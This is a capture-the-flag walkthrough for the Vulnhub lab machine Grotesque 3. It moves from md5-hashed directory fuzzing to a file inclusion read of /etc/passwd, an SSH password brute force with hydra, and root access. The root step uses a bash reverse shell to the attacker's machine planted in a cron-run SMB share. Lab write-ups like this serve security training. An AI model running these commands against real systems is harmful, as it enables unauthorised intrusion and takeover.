# Grotesque 3| Vulnhub | Walkthrough

| Category          | Details               |
|----------         |---------              |
| Platform          | [Grotesque  3](https://www.vulnhub.com/entry/grotesque-301,723/)              |
| Difficulty        | Medium                  |
| Target machine    | Linux                 |
| Attacker Machine  | Kali linux            |
| Tools             |  nmap, gobuster, wfuzz, hydra, pspy64  |


# Reconnaissance
Let’s find the IP address of the machine

[arp-scan](../Vulnhub/images/grotesque-3/image.png)

IP:- 10.0.2.21<br>
let’s scan the machines for ports and services

[Nmap Scan](../Vulnhub/images/grotesque-3/image-1.png)

nmap results show:
| Port      | Service       |
| --------- |---------------|
| 22/tcp    | ssh           |
| 80/tcp    | http          |

Let’s check out the webpage

[Webpage](../Vulnhub/images/grotesque-3/image-2.png)

# Enumeration
Used Gobuster to search for directories.

[Gobuster](../Vulnhub/images/grotesque-3/image-3.png)

Found nothing.<br>
Let’s check out the image file that was pointed out in the webpage

[image](../Vulnhub/images/grotesque-3/image-4.png)

[image_2](../Vulnhub/images/grotesque-3/image-5.png)

Just like grotesque 2 when i zoomed into the image i found this code `mdxxxxx` which can be interpreted as md5.<br>
Let’s convert the directory wordlist into md5 hashes and then run it through gobuster once again
```
for i in $(cat /usr/share/wordlist/dirbuster-list-lowercase-2.3-medium.txt); do echo $i | md5sum >> md5.txt; done
```

[md5 hash wordlist](../Vulnhub/images/grotesque-3/image-6.png)

Run gobuster with the new wordlist

[gobuter](../Vulnhub/images/grotesque-3/image-7.png)

There you have a php file. It’s just a plane blank page a possible LFI vulnerability.<br>
let’s use wfuzz to find the parameter needed to get go ahead.

[wfuzz](../Vulnhub/images/grotesque-3/image-8.png)

Got parameter “purpose”<br>
Let’s go ahead and find out what it returns
`purpose=/etc/passwd`

[/etc/passwd](../Vulnhub/images/grotesque-3/image-9.png)

Got users :- root & freddie<br>
Lets check for ssh key

[ssh key](../Vulnhub/images/grotesque-3/image-10.png)

No luck on that. nevertheless we have the usernames
let’s use the earlier hint once again here as it worked for directories it may work for passwords.

# Exploitation
Let’s conduct a Brute Force attack with the details we have.
```
hydra -l freddie -P md5.txt  ssh://ip_address -t 4
```

[hydra](../Vulnhub/images/grotesque-3/image-11.png)

Password cracked!!!!!!!

# Initial Access
[ssh Login](../Vulnhub/images/grotesque-3/image-12.png)

ssh login
we have initial access next up root access

# Privilege escalation

Run pspy64 and find all the cronjobs running

[pspy64](../Vulnhub/images/grotesque-3/image-13.png)

root keeps on running smbshare every 1–2 minutes.<br>
we can use this and run a reverse shell inside root.

enumerate smb to find share names<br>
`smbclient -L 127.0.0.1`
[smbclient](../Vulnhub/images/grotesque-3/image-14.png)

prepare a reverse in /tmp/ directory
```
echo 'bash -i >& /dev/tcp/kali-ip/kali-port 0>&1' > /tmp/reverse.sh
```
[reverse shell file](../Vulnhub/images/grotesque-3/image-15.png)

Connect to smb anonymously using share name “grotesque”<br>
and put the reverse shell file into smbshare

[smbclient_2](../Vulnhub/images/grotesque-3/image-16.png)

next up set up a listener on kali terminal and wait for root to connect

[root access](../Vulnhub/images/grotesque-3/image-17.png)

[user flag](image-19.png)

[root flag](../Vulnhub/images/grotesque-3/image-18.png)

Root flag & User Flag found!<br>
Hope this Walkthrough was fun, easy to follow and helpful to you.

Happy Hacking ~!!!
